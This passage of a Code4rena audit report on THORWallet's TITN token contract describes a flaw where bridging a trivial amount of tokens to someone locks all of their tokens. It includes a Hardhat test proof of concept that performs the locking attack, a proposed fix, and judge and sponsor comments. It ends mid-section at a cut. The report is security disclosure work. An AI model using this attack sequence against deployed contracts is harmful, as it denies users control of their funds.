<a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-626">zzykxx</a></em></p>
<p><a href="https://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/Titn.sol#L106-L108">https://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/Titn.sol#L106-L108</a></p>
<p><a href="https://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/Titn.sol#L82-L83">https://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/Titn.sol#L82-L83</a></p>
<h3 style="position:relative;" id="finding-description-and-impact-2"><a class="anchor before" aria-label="finding description and impact 2 permalink" href="https://code4rena.com/reports/2025-02-thorwallet#finding-description-and-impact-2"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description and impact</h3>
<p> <strong>Root Cause</strong>
The <code>Titn.sol</code> contract incorrectly tracks bridged token holders using a boolean flag (<code>isBridgedTokenHolder</code>). Once an address receives <em>any</em> bridged tokens (via cross-chain bridging), it is permanently marked as a “bridged token holder,” subjecting <strong>all</strong> tokens held by that address (including non-bridged ones) to transfer restrictions. This flawed design allows malicious actors to disrupt legitimate users by sending them a trivial amount of bridged tokens, thereby locking their entire TITN balance from being transferred freely.</p>
<p> <strong>Impact</strong></p>
<ul>
<li><strong>Loss of User Control</strong>: Users holding both bridged and non-bridged tokens cannot transfer <em>any</em> tokens unless sending them to the LayerZero endpoint or <code>transferAllowedContract</code>.</li>
<li><strong>Denial-of-Service (DoS) Attack Vector</strong>: An attacker can send 1 wei of bridged TITN to any address, permanently locking their TITN tokens (even those obtained through non-bridged means).</li>
<li><strong>Protocol Functionality Breakdown</strong>: The intended economic model (allowing free transfer of non-bridged tokens) is violated, undermining user trust and utility.</li>
</ul>
<hr>
<h3 style="position:relative;" id="proof-of-concept-2"><a class="anchor before" aria-label="proof of concept 2 permalink" href="https://code4rena.com/reports/2025-02-thorwallet#proof-of-concept-2"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Proof of Concept</h3>
<p> <strong>Code References</strong></p>
<ol>
<li>
<p><strong>Bridged Token Tracking (Incorrect Boolean):</strong><br>
<a href="https://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/Titn.sol#L106-L108"><code>Titn.sol#L106-L108</code></a>:  </p>
<pre data-index="7" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">if</span><span class="mtk1"> (!</span><span class="mtk12">isBridgedTokenHolder</span><span class="mtk1">[</span><span class="mtk12">_to</span><span class="mtk1">]) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">   </span><span class="mtk12">isBridgedTokenHolder</span><span class="mtk1">[</span><span class="mtk12">_to</span><span class="mtk1">] = </span><span class="mtk4">true</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<p>This marks <code>_to</code> as a bridged holder upon receiving <em>any</em> bridged tokens.</p>
</li>
<li>
<p><strong>Overly Restrictive Transfer Validation:</strong><br>
<a href="https://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/Titn.sol#L82-L83"><code>Titn.sol#L82-L83</code></a>:  </p>
<pre data-index="8" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">(</span><span class="mtk12">isBridgedTokenHolder</span><span class="mtk1">[</span><span class="mtk12">from</span><span class="mtk1">] || </span><span class="mtk12">block</span><span class="mtk1">.</span><span class="mtk12">chainid</span><span class="mtk1"> == </span><span class="mtk12">arbitrumChainId</span><span class="mtk1">) &amp;&amp;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">to</span><span class="mtk1"> != </span><span class="mtk12">lzEndpoint</span></span></span></code></pre>
<p>If <code>from</code> is marked as a bridged holder (even for 1 wei), transfers are blocked unless sent to <code>lzEndpoint</code>.</p>
</li>
</ol>
<p> <strong>Attack Scenario</strong></p>
<ol>
<li>
<p><strong>Malicious User Action</strong>:  </p>
<ul>
<li>Attacker bridges 1 wei of TITN to Victim’s address on Base.  </li>
<li>Victim is now marked as <code>isBridgedTokenHolder[Victim] = true</code>.</li>
</ul>
</li>
<li>
<p><strong>Victim’s Attempted Transfer</strong>:  </p>
<ul>
<li>Victim holds 1000 non-bridged TITN tokens.  </li>
<li>Tries to transfer 1000 TITN to another address (not <code>lzEndpoint</code> or <code>transferAllowedContract</code>).  </li>
<li>Transaction reverts with <code>BridgedTokensTransferLocked()</code>, even though all tokens are non-bridged.</li>
</ul>
</li>
</ol>
<p> <strong>Coded Proof of Concept</strong>
<code>./test/hardhat/Titn.test.ts</code></p>
<pre data-index="9" data-language="js" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">it</span><span class="mtk1">(</span><span class="mtk8">'malicious user can bridged token to others to lock thier non-bridged tokens'</span><span class="mtk1">, </span><span class="mtk4">async</span><span class="mtk1"> </span><span class="mtk4">function</span><span class="mtk1"> () {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">attacker</span><span class="mtk1"> = </span><span class="mtk12">user1</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">victim</span><span class="mtk1"> = </span><span class="mtk12">user2</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// mint non-bridged TITN to victim (Base)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">victimNonBridgedTokens</span><span class="mtk1"> = </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk12">utils</span><span class="mtk1">.</span><span class="mtk11">parseEther</span><span class="mtk1">(</span><span class="mtk8">'1'</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">baseTITN</span><span class="mtk1">.</span><span class="mtk11">connect</span><span class="mtk1">(</span><span class="mtk12">ownerA</span><span class="mtk1">).</span><span class="mtk11">transfer</span><span class="mtk1">(</span><span class="mtk12">victim</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">, </span><span class="mtk12">victimNonBridgedTokens</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">expect</span><span class="mtk1">(</span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">baseTITN</span><span class="mtk1">.</span><span class="mtk11">isBridgedTokenHolder</span><span class="mtk1">(</span><span class="mtk12">victim</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">)).</span><span class="mtk12">false</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// mint TITN to attacker (Arb)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// await arbTITN.connect(ownerB).transfer(attacker.address, ethers.utils.parseEther('1'))</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">attackerTokens</span><span class="mtk1"> = </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk12">utils</span><span class="mtk1">.</span><span class="mtk11">parseEther</span><span class="mtk1">(</span><span class="mtk8">'1'</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">options</span><span class="mtk1"> = </span><span class="mtk12">Options</span><span class="mtk1">.</span><span class="mtk11">newOptions</span><span class="mtk1">().</span><span class="mtk11">addExecutorLzReceiveOption</span><span class="mtk1">(</span><span class="mtk7">200000</span><span class="mtk1">, </span><span class="mtk7">0</span><span class="mtk1">).</span><span class="mtk11">toHex</span><span class="mtk1">().</span><span class="mtk11">toString</span><span class="mtk1">()</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">sendParam</span><span class="mtk1"> = [</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">eidB</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk12">utils</span><span class="mtk1">.</span><span class="mtk11">zeroPad</span><span class="mtk1">(</span><span class="mtk12">attacker</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">, </span><span class="mtk7">32</span><span class="mtk1">), </span><span class="mtk3">// to attacker</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">attackerTokens</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">attackerTokens</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">options</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk8">'0x'</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk8">'0x'</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        ]</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk4">const</span><span class="mtk1"> [</span><span class="mtk12">nativeFee</span><span class="mtk1">] = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">baseTITN</span><span class="mtk1">.</span><span class="mtk11">quoteSend</span><span class="mtk1">(</span><span class="mtk12">sendParam</span><span class="mtk1">, </span><span class="mtk4">false</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">baseTITN</span><span class="mtk1">.</span><span class="mtk11">send</span><span class="mtk1">(</span><span class="mtk12">sendParam</span><span class="mtk1">, [</span><span class="mtk12">nativeFee</span><span class="mtk1">, </span><span class="mtk7">0</span><span class="mtk1">], </span><span class="mtk12">ownerA</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">, { </span><span class="mtk12">value:</span><span class="mtk1"> </span><span class="mtk12">nativeFee</span><span class="mtk1"> })</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Attacker bridges 1 wei to Victim</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">tokensToSend</span><span class="mtk1"> = </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk12">utils</span><span class="mtk1">.</span><span class="mtk11">parseEther</span><span class="mtk1">(</span><span class="mtk8">'.000001'</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">attacksSendParam</span><span class="mtk1"> = [</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">eidA</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk12">utils</span><span class="mtk1">.</span><span class="mtk11">zeroPad</span><span class="mtk1">(</span><span class="mtk12">victim</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">, </span><span class="mtk7">32</span><span class="mtk1">), </span><span class="mtk3">// to victim</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">tokensToSend</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">tokensToSend</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">options</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk8">'0x'</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk8">'0x'</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        ]</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk4">const</span><span class="mtk1"> [</span><span class="mtk12">attacksNativeFee</span><span class="mtk1">] = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">arbTITN</span><span class="mtk1">.</span><span class="mtk11">quoteSend</span><span class="mtk1">(</span><span class="mtk12">attacksSendParam</span><span class="mtk1">, </span><span class="mtk4">false</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">arbTITN</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            .</span><span class="mtk11">connect</span><span class="mtk1">(</span><span class="mtk12">attacker</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            .</span><span class="mtk11">send</span><span class="mtk1">(</span><span class="mtk12">attacksSendParam</span><span class="mtk1">, [</span><span class="mtk12">nativeFee</span><span class="mtk1">, </span><span class="mtk7">0</span><span class="mtk1">], </span><span class="mtk12">attacker</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">, { </span><span class="mtk12">value:</span><span class="mtk1"> </span><span class="mtk12">attacksNativeFee</span><span class="mtk1"> })</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// POC: Victim attempts to transfer non-bridged tokens, Fails due to boolean flag.</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">expect</span><span class="mtk1">(</span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">baseTITN</span><span class="mtk1">.</span><span class="mtk11">isBridgedTokenHolder</span><span class="mtk1">(</span><span class="mtk12">victim</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">)).</span><span class="mtk12">true</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">try</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">arbTITN</span><span class="mtk1">.</span><span class="mtk11">connect</span><span class="mtk1">(</span><span class="mtk12">victim</span><span class="mtk1">).</span><span class="mtk11">transfer</span><span class="mtk1">(</span><span class="mtk12">ownerB</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">, </span><span class="mtk12">victimNonBridgedTokens</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">expect</span><span class="mtk1">.</span><span class="mtk11">fail</span><span class="mtk1">(</span><span class="mtk8">'Transaction should have reverted'</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        } </span><span class="mtk15">catch</span><span class="mtk1"> (</span><span class="mtk12">error</span><span class="mtk1">: </span><span class="mtk10">any</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk11">expect</span><span class="mtk1">(</span><span class="mtk12">error</span><span class="mtk1">.</span><span class="mtk12">message</span><span class="mtk1">).</span><span class="mtk12">to</span><span class="mtk1">.</span><span class="mtk11">include</span><span class="mtk1">(</span><span class="mtk8">'BridgedTokensTransferLocked'</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    })</span></span></span></code></pre>
<hr>
<h3 style="position:relative;" id="recommended-mitigation-steps-2"><a class="anchor before" aria-label="recommended mitigation steps 2 permalink" href="https://code4rena.com/reports/2025-02-thorwallet#recommended-mitigation-steps-2"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p> <strong>Track Bridged Token Balances Instead of Booleans</strong></p>
<ol>
<li>
<p><strong>Replace <code>isBridgedTokenHolder</code> with a <code>bridgedBalances</code> mapping</strong> to track the <em>exact amount</em> of bridged tokens per address:</p>
<pre data-index="10" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk11">mapping</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk4">=&gt;</span><span class="mtk1"> </span><span class="mtk12">uint256</span><span class="mtk1">) </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">bridgedBalances</span><span class="mtk1">;</span></span></span></code></pre>
</li>
<li>
<p><strong>Modify <code>_credit</code> to Increment Bridged Balance</strong>:<br>
Update the bridging logic to accumulate bridged amounts:</p>
<pre data-index="11" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">_credit</span><span class="mtk1">(...) </span><span class="mtk11">internal</span><span class="mtk1"> </span><span class="mtk11">override</span><span class="mtk1"> ... {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">   </span><span class="mtk12">bridgedBalances</span><span class="mtk1">[</span><span class="mtk12">_to</span><span class="mtk1">] += </span><span class="mtk12">_amountLD</span><span class="mtk1">; </span><span class="mtk3">// Track bridged amount</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
</li>
<li>
<p><strong>Update Transfer Validation Logic</strong>:<br>
Restrict transfers <em>only</em> if the amount exceeds the non-bridged balance:</p>
<pre data-index="12" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">_validateTransfer</span><span class="mtk1">(...) </span><span class="mtk11">internal</span><span class="mtk1"> </span><span class="mtk11">view</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">   </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">nonBridged</span><span class="mtk1"> = </span><span class="mtk11">balanceOf</span><span class="mtk1">(</span><span class="mtk12">from</span><span class="mtk1">) - </span><span class="mtk12">bridgedBalances</span><span class="mtk1">[</span><span class="mtk12">from</span><span class="mtk1">];</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">   </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">amount</span><span class="mtk1"> &gt; </span><span class="mtk12">nonBridged</span><span class="mtk1"> &amp;&amp; </span><span class="mtk12">to</span><span class="mtk1"> != </span><span class="mtk12">allowedAddress</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">       </span><span class="mtk12">revert</span><span class="mtk1"> </span><span class="mtk11">BridgedTokensTransferLocked</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">   }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
</li>
<li>
<p><strong>Decrement Bridged Balance on Approved Transfers</strong>:<br>
When tokens are sent to <code>lzEndpoint</code> or <code>transferAllowedContract</code>, reduce <code>bridgedBalances</code>:</p>
<pre data-index="13" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">transfer</span><span class="mtk1">(...) </span><span class="mtk11">public</span><span class="mtk1"> </span><span class="mtk11">override</span><span class="mtk1"> ... {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">   </span><span class="mtk4">super</span><span class="mtk1">.</span><span class="mtk11">transfer</span><span class="mtk1">(...);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">   </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">to</span><span class="mtk1"> == </span><span class="mtk12">lzEndpoint</span><span class="mtk1"> || </span><span class="mtk12">to</span><span class="mtk1"> == </span><span class="mtk12">transferAllowedContract</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">       </span><span class="mtk12">bridgedBalances</span><span class="mtk1">[</span><span class="mtk12">from</span><span class="mtk1">] = </span><span class="mtk12">bridgedBalances</span><span class="mtk1">[</span><span class="mtk12">from</span><span class="mtk1">] &gt; </span><span class="mtk12">amount</span><span class="mtk1"> </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">           ? </span><span class="mtk12">bridgedBalances</span><span class="mtk1">[</span><span class="mtk12">from</span><span class="mtk1">] - </span><span class="mtk12">amount</span><span class="mtk1"> </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">           : </span><span class="mtk7">0</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">   }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
</li>
</ol>
<p> <strong>Benefits</strong></p>
<ul>
<li><strong>Precision</strong>: Only bridged tokens are restricted; non-bridged tokens remain freely transferable.  </li>
<li><strong>No DoS Vector</strong>: Attackers cannot lock users’ non-bridged tokens by sending trivial bridged amounts.  </li>
<li><strong>Backward Compatibility</strong>: Maintains existing protocol invariants while fixing the critical flaw.</li>
</ul>
<p><strong>cacaomatt (THORWallet) acknowledged</strong></p>
<p><strong><a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/F-7?commentParent=eRGpss6479X">0xnev (judge) commented</a>:</strong></p>
<blockquote>
<p>Valid, I believe medium is appropriate based on C4 medium severity guidelines, given no assets are compromised/lost. </p>
<blockquote>
<p>2 — Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.</p>
</blockquote>
<p>This only impacts the following invariant on Base.</p>
<blockquote>
<p>Non-bridged TITN Tokens: Holders can transfer their TITN tokens freely to any address as long as the tokens have not been bridged from ARBITRUM.</p>
</blockquote>
<p>If usage of tokens are desired for defi protocols, the tokens can still be bridged via transfers to the LZ endpoint</p>
</blockquote>
<p><strong><a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/F-7?commentParent=eRGpss6479X&amp;commentChild=ME742qfuh2P">cacaomatt (THORWallet) acknowledged and commented</a>:</strong></p>
<blockquote>
<p>This is no longer applicable as our PR to address finding F-9 prevents this from happening in the first place.</p>
</blockquote>
<hr>
<h1 style="position:relative;" id="low-risk-and-non-critical-issues"><a class="anchor before" aria-label="low risk and non critical issues permalink" href="https://code4rena.com/reports/2025-02-thorwallet#low-risk-and-non-critical-issues"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Low Risk and Non-Critical Issues</h1>
<p>For this audit, 9 reports were submitted by wardens detailing low risk and non-critical issues. The <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-812">report highlighted below</a> by <strong>Sparrow</strong> received the top score from the judge.</p>
<p><em>The following wardens also submitted reports: <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-399">Anonymous0x1C41</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-732">EPSec</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-508">eta</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-394">Fitro</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-519">inh3l</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-662">peanuts</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-232">tpiliposian</a>, and <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-574">udo</a>.</em></p>
<h2 style="position:relative;" id="qa-01-dust-amount-loss-in-cross-chain-titn-token-transfers"><a class="anchor before" aria-label="qa 01 dust amount loss in cross chain titn token transfers permalink" href="https://code4rena.com/reports/2025-02-thorwallet#qa-01-dust-amount-loss-in-cross-chain-titn-token-transfers"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>[QA-01] Dust Amount Loss in Cross-Chain TITN Token Transfers</h2>
<p><strong>Impact</strong></p>
<p>When bridging TITN tokens cross-chain using LayerZero’s OFT standard, small dust amounts are removed to handle decimal precision differences between chains. This affects initial TITN deposits, user claims, and remaining TITN withdrawals.</p>
<h3 style="position:relative;" id="vulnerability-details"><a class="anchor before" aria-label="vulnerability details permalink" href="https://code4rena.com/reports/2025-02-thorwallet#vulnerability-details"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Vulnerability Details</h3>
<p>The TITN contract inherits from OFT:</p>
